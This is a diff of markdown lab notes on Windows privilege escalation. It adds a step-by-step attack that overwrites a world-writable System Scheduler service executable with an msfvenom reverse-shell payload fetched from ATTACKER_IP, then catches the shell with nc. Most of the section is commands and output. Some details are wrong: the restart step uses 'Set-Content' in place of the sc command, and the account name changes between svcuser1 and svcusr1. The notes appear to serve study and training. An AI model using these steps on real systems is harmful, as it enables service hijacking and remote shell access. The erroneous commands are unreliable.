@@ -213,8 +213,87 @@ HKLM\SYSTEM\CurrentControlSet\Services\
   * **ObjectName** shows account used to start the service.
   * **Security** stores DACL if configured for the service.
 * Only administrators can modify these registry entries by default.
+
 ## Insecure Permissions on Service Executable
-* 
+* Attacker can gain privileges of service's account trivially.
+* Splinterware System Scheduler vulnerability example.
+```
+sc qc WindowsScheduler
+[SC] QueryServiceConfig SUCCESS
+
+SERVICE_NAME: windowsscheduler
+        TYPE               : 10  WIN32_OWN_PROCESS
+        START_TYPE         : 2   AUTO_START
+        ERROR_CONTROL      : 0   IGNORE
+        BINARY_PATH_NAME   : C:\PROGRA~2\SYSTEM~1\WService.exe
+        LOAD_ORDER_GROUP   :
+        TAG                : 0
+        DISPLAY_NAME       : System Scheduler Service
+        DEPENDENCIES       :
+        SERVICE_START_NAME : .\svcuser1
+```
+* Check permissions on the executable.
+```
+icacls C:\PROGRA~2\SYSTEM~1\WService.exe
+C:\PROGRA~2\SYSTEM~1\WService.exe Everyone:(I)(M)
+                                  NT AUTHORITY\SYSTEM:(I)(F)
+                                  BUILTIN\Administrators:(I)(F)
+                                  BUILTIN\Users:(I)(RX)
+                                  APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
+                                  APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX)
+
+Successfully processed 1 files; Failed processing 0 files
+```
+* Everyone group has modify permissions `(M)` on executable.
+  * Can be overwritten with malicious payload.
+* Service will be executed with privileges of "svcuser1" user account.
+* Generate exe-service payload using `msfvenom`.
+```
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4445 -f exe-service -o rev-svc.exe
+``` 
+* Serve payload through python webserver.
+```
+python3 -m http.server
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+```
+* Pull payload from PowerShell.
+```
+wget http://ATTACKER_IP:8000/rev-svc.exe -O rev-svc.exe
+``` 
+* Replace service executable with payload.
+```
+cd C:\PROGRA~2\SYSTEM~1\
+
+C:\PROGRA~2\SYSTEM~1> move WService.exe WService.exe.bkp
+        1 file(s) moved.
+
+C:\PROGRA~2\SYSTEM~1> move C:\Users\thm-unpriv\rev-svc.exe WService.exe
+        1 file(s) moved.
+```
+* Grant full permissions to Everyone group as need another user to execute payload.
+```
+icacls WService.exe /grant Everyone:F
+        Successfully processed 1 files.
+```
+* Start reverse listener on attacking machine.
+```
+nc -lvnp 4445
+Listening on 0.0.0.0 4445
+```
+* Restart service (if current user has permissions).
+```
+Set-Content stop windowsscheduler
+Set-Content start windowsscheduler
+```
+* Reverse shell with svcusr1 privileges received.
+```
+Connection received on 10.10.175.90 50649
+Microsoft Windows [Version 10.0.17763.1821]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>whoami
+wprivesc1\svcusr1
+```
 ## Unquoted Service Paths
 ## Insecure Service Permissions
 
